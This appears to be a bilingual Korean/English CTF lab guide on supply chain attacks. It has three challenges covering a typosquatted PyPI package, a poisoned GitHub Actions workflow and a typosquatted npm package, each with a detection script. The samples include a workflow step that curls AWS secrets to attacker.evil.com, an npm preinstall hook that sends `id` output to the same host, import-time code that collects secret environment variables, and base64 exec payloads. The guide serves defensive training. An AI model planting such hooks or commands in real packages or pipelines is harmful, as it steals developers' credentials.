> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 공급망 공격 CTF 실습 랩

## 실습 환경 준비

### Docker Compose 환경

```yaml
# docker-compose.yml
version: "3.9"

services:
  pypi-mirror:
    image: python:3.11-slim
    container_name: pypi-mirror
    ports:
      - "8080:8080"
    command: >
      sh -c "pip install pypiserver -q &&
             python3 -m pypiserver.app -p 8080 /packages --disable-fallback"
    volumes:
      - ./packages:/packages

  victim-build:
    image: python:3.11-slim
    container_name: victim-build
    command: sleep infinity
    volumes:
      - ./project:/project

  npm-mirror:
    image: node:18-slim
    container_name: npm-mirror
    command: sleep infinity
    volumes:
      - ./npm-packages:/packages

networks:
  supply-chain-net:
    driver: bridge
```

### 필수 도구 설치

```bash
pip install pip-audit safety bandit
npm install -g npm-audit-ci
```

---

## 실습 1: 악성 PyPI 패키지 분석

### 목표

의심스러운 PyPI 패키지를 분석하여 내부에 숨겨진 악성 코드와 플래그를 발견한다.

**플래그 형식**: `CTF{malicious_pypi_<package_name>_backdoor_found}`

### 악성 패키지 생성

```python
#!/usr/bin/env python3
"""CTF용 악성 PyPI 패키지 시뮬레이터"""

import os
import zipfile
from pathlib import Path


# 정상적으로 보이는 패키지 (requests 타이포스쿼팅)
MALICIOUS_PACKAGE = {
    "name": "requestss",  # 타이포스쿼팅: requests 오타
    "version": "2.31.1",  # 정상 패키지와 유사한 버전

    "setup.py": '''
from setuptools import setup, find_packages
import subprocess, base64, os

# 설치 시 실행되는 악성 코드
def _install_hook():
    flag_data = base64.b64decode(
        "Q1RGe21hbGljaW91c19weXBpX3JlcXVlc3Rzc19iYWNrZG9vcl9mb3VuZH0="
    ).decode()
    os.environ["MALWARE_FLAG"] = flag_data
    # 실제 악성코드는 여기서 C2 연결, 데이터 탈취 등 수행

_install_hook()

setup(
    name="requestss",
    version="2.31.1",
    description="HTTP library for Python (typosquat demo)",
    packages=find_packages(),
    install_requires=["certifi", "charset-normalizer"],
)
''',

    "requestss/__init__.py": '''
import base64
import os

# 정상 requests를 import하면서 악성 기능 추가
try:
    import requests as _real_requests
    from requests import *
    from requests import get, post, put, delete
except ImportError:
    pass

# 백도어: 환경변수와 네트워크 요청 수집
_EXFIL_KEY = "MTJiYTM0Y2Q1NmVmNzg="
_FLAG = "CTF{malicious_pypi_requestss_backdoor_found}"

def _exfiltrate():
    """환경 변수 수집 (시뮬레이션)"""
    sensitive = {k: v for k, v in os.environ.items()
                 if any(kw in k.upper() for kw in
                        ["KEY", "SECRET", "TOKEN", "PASSWORD", "PASS"])}
    return sensitive

# 패키지 임포트 시 자동 실행
_collected = _exfiltrate()
''',

    "requestss/session.py": '''
"""악성 세션 클래스 - 모든 HTTP 요청을 도청"""

class Session:
    _BACKDOOR_C2 = "http://attacker.evil.com/collect"
    _FLAG = "CTF{malicious_pypi_requestss_backdoor_found}"

    def request(self, method, url, **kwargs):
        # 요청 내용을 C2 서버로 전송 (시뮬레이션)
        sensitive_data = {
            "url": url,
            "method": method,
            "headers": str(kwargs.get("headers", {})),
        }
        return sensitive_data
''',
}


def create_malicious_wheel(output_dir: str) -> str:
    """악성 패키지 .whl 파일 생성"""
    Path(output_dir).mkdir(exist_ok=True)

    pkg_name = MALICIOUS_PACKAGE["name"]
    version = MALICIOUS_PACKAGE["version"]
    wheel_name = f"{pkg_name}-{version}-py3-none-any.whl"
    wheel_path = Path(output_dir) / wheel_name

    with zipfile.ZipFile(wheel_path, "w", zipfile.ZIP_DEFLATED) as whl:
        for filename, content in MALICIOUS_PACKAGE.items():
            if filename in ("name", "version"):
                continue
            whl.writestr(filename, content.strip())

        # METADATA 파일
        metadata = f"""Metadata-Version: 2.1
Name: {pkg_name}
Version: {version}
Summary: HTTP library for Python
Author: legit-developer
"""
        whl.writestr(f"{pkg_name}-{version}.dist-info/METADATA", metadata)

    print(f"[+] 악성 패키지 생성: {wheel_path}")
    return str(wheel_path)


if __name__ == "__main__":
    create_malicious_wheel("packages")
```

### 풀이

```python
#!/usr/bin/env python3
"""PyPI 패키지 악성 코드 분석 도구"""

import argparse
import ast
import base64
import re
import zipfile
from pathlib import Path


MALICIOUS_INDICATORS: list[tuple[str, str]] = [
    (r"subprocess\.(run|call|Popen|check_output)", "서브프로세스 실행"),
    (r"os\.system|os\.popen", "OS 명령 실행"),
    (r"socket\.connect|urllib\.request|requests\.(get|post)", "네트워크 연결"),
    (r"base64\.(b64decode|decodebytes)", "Base64 디코딩"),
    (r"eval\s*\(|exec\s*\(|compile\s*\(", "동적 코드 실행"),
    (r"__import__\s*\(", "동적 임포트"),
    (r"CTF\{[^}]+\}", "CTF 플래그"),
    (r"(?i)(backdoor|c2|command.and.control|exfil)", "악성 키워드"),
]

SETUP_HOOKS = [
    "cmdclass",
    "install_requires",
    "setup_requires",
    "entry_points",
    "_install_hook",
    "post_install",
]


def analyze_wheel_package(wheel_path: str) -> list[dict]:
    """wheel 패키지 정적 분석"""
    findings: list[dict] = []
    path = Path(wheel_path)

    if not path.exists():
        print(f"[-] 파일 없음: {wheel_path}")
        return findings

    with zipfile.ZipFile(wheel_path, "r") as whl:
        for name in whl.namelist():
            content = whl.read(name).decode("utf-8", errors="ignore")

            # 악성 지표 탐지
            for pattern, label in MALICIOUS_INDICATORS:
                matches = re.finditer(pattern, content, re.MULTILINE)
                for m in matches:
                    findings.append({
                        "file": name,
                        "type": label,
                        "match": m.group()[:100],
                        "line": content[:m.start()].count("\n") + 1,
                    })

            # setup.py 후킹 탐지
            if "setup.py" in name or "setup.cfg" in name:
                for hook in SETUP_HOOKS:
                    if hook in content:
                        findings.append({
                            "file": name,
                            "type": "setup_hook",
                            "match": f"Install hook: {hook}",
                            "line": 0,
                        })

    return findings


def decode_obfuscated_strings(content: str) -> list[str]:
    """난독화된 문자열 디코딩"""
    decoded: list[str] = []

    # Base64 인코딩 문자열 탐지 및 디코딩
    b64_pattern = re.compile(r'["\']([A-Za-z0-9+/]{16,}={0,2})["\']')
    for m in b64_pattern.finditer(content):
        try:
            decoded_bytes = base64.b64decode(m.group(1))
            decoded_str = decoded_bytes.decode("utf-8")
            if decoded_str.isprintable():
                decoded.append(decoded_str)
        except Exception:
            pass

    return decoded


def check_dependency_confusion(requirements_path: str) -> list[dict]:
    """의존성 혼동 취약점 탐지"""
    findings: list[dict] = []

    try:
        with open(requirements_path) as f:
            requirements = f.readlines()
    except FileNotFoundError:
        return findings

    # 내부 패키지명 패턴 (하이픈, 회사명 등)
    internal_patterns = [
        r"(?i)internal[-_]",
        r"(?i)private[-_]",
        r"(?i)corp[-_]",
        r"(?i)company[-_]",
        r"@\S+",  # scope package (npm)
    ]

    for line in requirements:
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        for pattern in internal_patterns:
            if re.search(pattern, line):
                findings.append({
                    "package": line,
                    "risk": "DEPENDENCY_CONFUSION",
                    "description": "내부 패키지가 공개 레지스트리에도 등록될 수 있음",
                })

    return findings


def analyze_package(package_path: str) -> None:
    path = Path(package_path)
    print(f"[*] 패키지 분석: {path.name}")

    findings = analyze_wheel_package(package_path)

    print(f"\n[*] 악성 지표 {len(findings)}개 탐지:")
    flags: list[str] = []

    for f in findings:
        print(f"  [{f['type']}] {f['file']}:{f['line']}")
        print(f"    {f['match'][:80]}")
        if "CTF{" in f["match"]:
            flags.append(f["match"])

    # 난독화 문자열 디코딩
    print("\n[*] 난독화 문자열 디코딩:")
    with zipfile.ZipFile(package_path, "r") as whl:
        for name in whl.namelist():
            content = whl.read(name).decode("utf-8", errors="ignore")
            decoded = decode_obfuscated_strings(content)
            for d in decoded:
                print(f"  Base64 디코딩: {d}")
                if "CTF{" in d:
                    flags.append(d)

    if flags:
        flags_found = re.findall(r"CTF\{[^}]+\}", " ".join(flags))
        for flag in set(flags_found):
            print(f"\n[+] 플래그: {flag}")


def main() -> None:
    parser = argparse.ArgumentParser(description="PyPI 악성 패키지 분석 도구")
    parser.add_argument("package", help="분석할 .whl 또는 .tar.gz 파일")
    parser.add_argument("--requirements", help="의존성 혼동 검사용 requirements.txt")
    args = parser.parse_args()

    analyze_package(args.package)

    if args.requirements:
        findings = check_dependency_confusion(args.requirements)
        if findings:
            print(f"\n[!] 의존성 혼동 위험: {len(findings)}개")
            for f in findings:
                print(f"  {f['package']} → {f['risk']}")


if __name__ == "__main__":
    main()
```

---

## 실습 2: CI/CD 파이프라인 독 탐지

### 목표

GitHub Actions 워크플로우와 CI/CD 스크립트를 분석하여 공급망 독(poisoning) 공격을 탐지한다.

**플래그 형식**: `CTF{cicd_poisoning_<step_name>_backdoor_detected}`

### 취약한 워크플로우 예시

```yaml
# .github/workflows/build.yml (악성 버전)
name: Build and Deploy

on:
  push:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      # BACKDOOR: 악성 타사 액션 사용
      - name: Setup dependencies
        uses: malicious-actor/setup-deps@v1  # 핀닝 없음!

      # BACKDOOR: 환경 변수 외부 전송
      - name: Install packages
        run: |
          pip install requestss==2.31.1  # 타이포스쿼팅 패키지
          pip install -r requirements.txt

      # BACKDOOR: 비밀 외부 전송
      - name: Build
        run: |
          echo "Building..."
          curl -X POST https://attacker.evil.com/collect \
            -d "secrets=${{ secrets.AWS_SECRET_KEY }}"

      # 정상으로 위장한 악성 코드
      - name: Run tests
        run: |
          python -c "
          import base64
          exec(base64.b64decode('cHJpbnQoJ0NURnthY3Rpb25zX3BvaXNvbmluZ19idWlsZF9iYWNrZG9vcl9kZXRlY3RlZH0nKQ=='))
          "
```

### 풀이

```python
#!/usr/bin/env python3
"""CI/CD 파이프라인 독 탐지 도구"""

import argparse
import base64
import re
import yaml
from pathlib import Path


CICD_RISK_PATTERNS: list[tuple[str, str, str]] = [
    # (패턴, 설명, 심각도)
    (r"uses:\s*\S+@(?!v\d|[0-9a-f]{40})", "버전 미핀닝 액션", "HIGH"),
    (r"curl.*attacker|wget.*evil|nc\s+-[lp]", "C2 연결 의심", "CRITICAL"),
    (r"base64\s+-d|base64\.b64decode", "Base64 디코딩", "MEDIUM"),
    (r"eval\s*\(|exec\s*\(", "동적 코드 실행", "HIGH"),
    (r"\$\{\{.*secrets\.\w+\}\}.*curl|curl.*\$\{\{.*secrets", "시크릿 외부 전송", "CRITICAL"),
    (r"requestss|numpy-\w+|torch-\w+", "타이포스쿼팅 패키지", "HIGH"),
    (r"CTF\{[^}]+\}", "CTF 플래그", "INFO"),
]


def parse_github_actions(workflow_path: str) -> dict:
    """GitHub Actions 워크플로우 파싱"""
    with open(workflow_path) as f:
        try:
            return yaml.safe_load(f)
        except yaml.YAMLError:
            return {}


def analyze_workflow_steps(workflow: dict) -> list[dict]:
    """워크플로우 스텝 분석"""
    findings: list[dict] = []

    jobs = workflow.get("jobs", {})
    for job_name, job in jobs.items():
        steps = job.get("steps", [])
        for step_idx, step in enumerate(steps):
            step_name = step.get("name", f"step_{step_idx}")
            step_uses = step.get("uses", "")
            step_run = step.get("run", "")

            content = f"{step_uses} {step_run}"

            for pattern, description, severity in CICD_RISK_PATTERNS:
                matches = re.finditer(pattern, content, re.IGNORECASE)
                for m in matches:
                    findings.append({
                        "job": job_name,
                        "step": step_name,
                        "severity": severity,
                        "description": description,
                        "match": m.group()[:100],
                    })

    return findings


def decode_hidden_commands(content: str) -> list[str]:
    """숨겨진 명령 디코딩"""
    decoded: list[str] = []

    # Base64 탐지
    b64_pattern = re.compile(r"'([A-Za-z0-9+/]{20,}={0,2})'")
    for m in b64_pattern.finditer(content):
        try:
            decoded_str = base64.b64decode(m.group(1)).decode("utf-8")
            if decoded_str.isprintable() and len(decoded_str) > 5:
                decoded.append(decoded_str)
        except Exception:
            pass

    return decoded


def analyze_cicd_pipeline(workflow_content: str) -> None:
    """CI/CD 파이프라인 분석 (YAML 문자열)"""
    print("[*] CI/CD 파이프라인 분석\n")

    try:
        workflow = yaml.safe_load(workflow_content)
    except yaml.YAMLError as e:
        print(f"[-] YAML 파싱 오류: {e}")
        return

    findings = analyze_workflow_steps(workflow)
    decoded_cmds = decode_hidden_commands(workflow_content)

    print(f"[*] 위험 지표 {len(findings)}개 탐지:")
    flags: list[str] = []

    for f in findings:
        print(f"  [{f['severity']}] Job:{f['job']} Step:{f['step']}")
        print(f"    {f['description']}: {f['match'][:80]}")
        if "CTF{" in f["match"]:
            flags.append(f["match"])

    if decoded_cmds:
        print(f"\n[*] 디코딩된 숨겨진 명령:")
        for cmd in decoded_cmds:
            print(f"  {cmd}")
            flags_found = re.findall(r"CTF\{[^}]+\}", cmd)
            flags.extend(flags_found)

    if flags:
        all_flags = re.findall(r"CTF\{[^}]+\}", " ".join(flags))
        for flag in set(all_flags):
            print(f"\n[+] 플래그: {flag}")


# 취약한 워크플로우 (실습용)
VULNERABLE_WORKFLOW_YAML = """
name: Build and Deploy
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - name: Setup dependencies
        uses: malicious-actor/setup-deps@v1
      - name: Install packages
        run: pip install requestss==2.31.1
      - name: Run tests
        run: |
          python -c "
          import base64
          exec(base64.b64decode('cHJpbnQoJ0NURnthY3Rpb25zX3BvaXNvbmluZ19idWlsZF9iYWNrZG9vcl9kZXRlY3RlZH0nKQ=='))
          "
"""


def main() -> None:
    parser = argparse.ArgumentParser(description="CI/CD 독 탐지 도구")
    parser.add_argument("--workflow", "-w", help="분석할 워크플로우 파일")
    parser.add_argument("--sample", action="store_true", help="샘플 워크플로우 분석")
    args = parser.parse_args()

    if args.sample or not args.workflow:
        analyze_cicd_pipeline(VULNERABLE_WORKFLOW_YAML)
    elif args.workflow:
        with open(args.workflow) as f:
            content = f.read()
        analyze_cicd_pipeline(content)


if __name__ == "__main__":
    main()
```

---

## 실습 3: npm 패키지 타이포스쿼팅 탐지

### 목표

npm 패키지의 타이포스쿼팅 공격을 탐지하고 악성 패키지 내부의 백도어를 분석한다.

**플래그 형식**: `CTF{npm_typosquat_<package_name>_malware_found}`

### 풀이

```python
#!/usr/bin/env python3
"""npm 패키지 타이포스쿼팅 및 악성 코드 분석 도구"""

import argparse
import json
import re
from pathlib import Path


POPULAR_NPM_PACKAGES = [
    "express", "react", "lodash", "axios", "moment",
    "webpack", "typescript", "eslint", "jest", "babel",
    "vue", "angular", "next", "nuxt", "gatsby",
]


def generate_typosquats(package_name: str) -> list[str]:
    """타이포스쿼팅 후보 생성"""
    candidates: list[str] = []

    # 문자 삽입
    for i in range(len(package_name)):
        for char in "abcdefghijklmnopqrstuvwxyz":
            candidates.append(package_name[:i] + char + package_name[i:])

    # 문자 삭제
    for i in range(len(package_name)):
        candidates.append(package_name[:i] + package_name[i+1:])

    # 문자 치환
    substitutions = {"0": "o", "1": "l", "i": "1", "e": "3", "a": "@"}
    typo = package_name
    for orig, replacement in substitutions.items():
        typo = typo.replace(orig, replacement)
    if typo != package_name:
        candidates.append(typo)

    # 중복 제거 및 길이 필터링
    return list(set(c for c in candidates
                    if c != package_name and 2 <= len(c) <= 30))[:20]


MALICIOUS_NPM_PACKAGE = {
    "name": "axois",  # axios 타이포스쿼팅
    "version": "1.6.2",
    "description": "Promise based HTTP client (typosquat demo)",
    "main": "index.js",
    "scripts": {
        "preinstall": "node -e \"require('child_process').exec('id | curl -d @- http://attacker.evil.com/collect')\"",
    },
    "index.js": """
// 정상 axios처럼 보이지만 백도어 포함
const axios = require('axios');
const os = require('os');
const { execSync } = require('child_process');

// 백도어: 설치 시 환경 정보 수집
const flag = "CTF{npm_typosquat_axois_malware_found}";

// 환경 변수 탈취 (시뮬레이션)
function _exfiltrate() {
    const sensitive = Object.fromEntries(
        Object.entries(process.env)
            .filter(([k]) => /KEY|SECRET|TOKEN|PASSWORD/i.test(k))
    );
    return sensitive;
}

// 정상 axios 기능 래핑
module.exports = {
    ...axios,
    get: (url, config) => {
        _exfiltrate(); // 매 요청마다 데이터 수집
        return axios.get(url, config);
    },
    _flag: flag,
};
""",
}


def analyze_package_json(package_json_content: str) -> list[dict]:
    """package.json 분석"""
    findings: list[dict] = []

    try:
        pkg = json.loads(package_json_content)
    except json.JSONDecodeError:
        return findings

    # preinstall/postinstall 스크립트 탐지
    scripts = pkg.get("scripts", {})
    dangerous_scripts = ["preinstall", "postinstall", "install", "prepare"]
    for script_name in dangerous_scripts:
        if script_name in scripts:
            cmd = scripts[script_name]
            findings.append({
                "type": "lifecycle_script",
                "severity": "HIGH",
                "description": f"설치 스크립트: {script_name}",
                "value": cmd[:100],
            })

    # 의존성 분석
    for dep_type in ["dependencies", "devDependencies", "optionalDependencies"]:
        deps = pkg.get(dep_type, {})
        for dep_name, version in deps.items():
            # 버전 핀닝 없음 탐지
            if version.startswith("*") or version == "latest":
                findings.append({
                    "type": "unpinned_version",
                    "severity": "MEDIUM",
                    "description": f"버전 미핀닝: {dep_name}@{version}",
                    "value": dep_name,
                })

    return findings


def create_npm_challenge(output_dir: str) -> None:
    """npm 챌린지 패키지 생성"""
    Path(output_dir).mkdir(exist_ok=True)

    pkg_json = {
        "name": MALICIOUS_NPM_PACKAGE["name"],
        "version": MALICIOUS_NPM_PACKAGE["version"],
        "description": MALICIOUS_NPM_PACKAGE["description"],
        "main": MALICIOUS_NPM_PACKAGE["main"],
        "scripts": MALICIOUS_NPM_PACKAGE["scripts"],
    }

    pkg_path = Path(output_dir) / MALICIOUS_NPM_PACKAGE["name"]
    pkg_path.mkdir(exist_ok=True)

    (pkg_path / "package.json").write_text(
        json.dumps(pkg_json, indent=2)
    )
    (pkg_path / "index.js").write_text(
        MALICIOUS_NPM_PACKAGE["index.js"].strip()
    )

    print(f"[+] npm 챌린지 패키지 생성: {pkg_path}")


def analyze_npm_package(package_dir: str) -> None:
    pkg_path = Path(package_dir)
    print(f"[*] npm 패키지 분석: {pkg_path.name}")

    flags: list[str] = []

    # package.json 분석
    pkg_json_path = pkg_path / "package.json"
    if pkg_json_path.exists():
        content = pkg_json_path.read_text()
        findings = analyze_package_json(content)

        print(f"\n[*] package.json 위험 지표 {len(findings)}개:")
        for f in findings:
            print(f"  [{f['severity']}] {f['description']}")
            print(f"    값: {f['value']}")

    # JS 파일 분석
    for js_file in pkg_path.rglob("*.js"):
        content = js_file.read_text(errors="ignore")
        js_flags = re.findall(r"CTF\{[^}]+\}", content)
        flags.extend(js_flags)

        # 위험 패턴
        danger_patterns = [
            r"child_process|execSync|spawnSync",
            r"require\(['\"]net['\"]|require\(['\"]http",
            r"process\.env\b",
        ]
        for pattern in danger_patterns:
            if re.search(pattern, content):
                print(f"  [!] 위험 패턴 ({js_file.name}): {pattern}")

    if flags:
        for flag in set(flags):
            print(f"\n[+] 플래그: {flag}")

    # 타이포스쿼팅 확인
    pkg_name = pkg_path.name
    for popular in POPULAR_NPM_PACKAGES:
        squats = generate_typosquats(popular)
        if pkg_name in squats:
            print(f"\n[!] 타이포스쿼팅 탐지: '{pkg_name}' ← '{popular}' 타이포")


def main() -> None:
    parser = argparse.ArgumentParser(description="npm 패키지 악성 코드 분석")
    parser.add_argument("--create", help="챌린지 패키지 생성 디렉토리")
    parser.add_argument("--analyze", help="분석할 패키지 디렉토리")
    args = parser.parse_args()

    if args.create:
        create_npm_challenge(args.create)
    elif args.analyze:
        analyze_npm_package(args.analyze)
    else:
        print("[*] --create npm-pkgs 또는 --analyze npm-pkgs/axois")


if __name__ == "__main__":
    main()
```

---

<a name="english"></a>

# Supply Chain Attacks CTF Practice Lab

## Lab Environment Setup

```bash
docker-compose up -d
pip install pip-audit safety pyyaml
```

---

## Challenge 1: Malicious PyPI Package Analysis

### Objective

Analyze a suspicious PyPI package to detect hidden malware and extract the flag.

**Flag format**: `CTF{malicious_pypi_<package_name>_backdoor_found}`

### Solution Steps

```bash
# Generate malicious package
python3 create_malicious_pkg.py
# Creates packages/requestss-2.31.1-py3-none-any.whl

# Analyze the package
python3 pypi_analyzer.py packages/requestss-2.31.1-py3-none-any.whl
# Detects: setup hooks, network connections, base64 encoding
# Decodes: CTF{malicious_pypi_requestss_backdoor_found}

# Using safety / pip-audit
safety check --file requirements.txt
pip-audit -r requirements.txt

# Manual inspection
unzip -l packages/requestss-2.31.1-py3-none-any.whl
unzip -p packages/requestss-2.31.1-py3-none-any.whl requestss/__init__.py
```

### Red Flags

| Indicator | Risk Level | Description |
|-----------|------------|-------------|
| `subprocess.run()` in `__init__.py` | CRITICAL | Executes system commands on import |
| `base64.b64decode` + `exec` | CRITICAL | Obfuscated malicious payload |
| `preinstall` script in setup.py | HIGH | Runs code before package installs |
| Typosquatting name (`requestss`) | HIGH | Tricks users into installing wrong package |

---

## Challenge 2: CI/CD Pipeline Poisoning Detection

### Objective

Analyze a GitHub Actions workflow to detect supply chain poisoning and extract the hidden flag.

**Flag format**: `CTF{cicd_poisoning_<step_name>_backdoor_detected}`

### Solution Steps

```bash
# Analyze sample poisoned workflow
python3 cicd_analyzer.py --sample

# Analyze real workflow file
python3 cicd_analyzer.py --workflow .github/workflows/build.yml

# Key findings in sample:
# [CRITICAL] Unpinned action: malicious-actor/setup-deps@v1
# [HIGH] Typosquatting package: requestss
# [CRITICAL] Secrets exfiltration via curl
# [INFO] Base64-encoded command decodes to: CTF{actions_poisoning_build_backdoor_detected}
```

---

## Challenge 3: npm Typosquatting Analysis

### Objective

Detect npm typosquatting and analyze the malicious package for backdoors and the flag.

**Flag format**: `CTF{npm_typosquat_<package_name>_malware_found}`

### Solution Steps

```bash
# Create challenge packages
python3 npm_analyzer.py --create npm-pkgs/

# Analyze axois (axios typosquat)
python3 npm_analyzer.py --analyze npm-pkgs/axois
# Detects typosquatting of 'axios'
# Finds preinstall backdoor script
# Flag: CTF{npm_typosquat_axois_malware_found}

# Using npm audit
cd npm-pkgs/axois && npm audit

# Manual inspection
cat npm-pkgs/axois/package.json
# Check scripts.preinstall for malicious commands
cat npm-pkgs/axois/index.js | grep -E "CTF|exec|env"
```
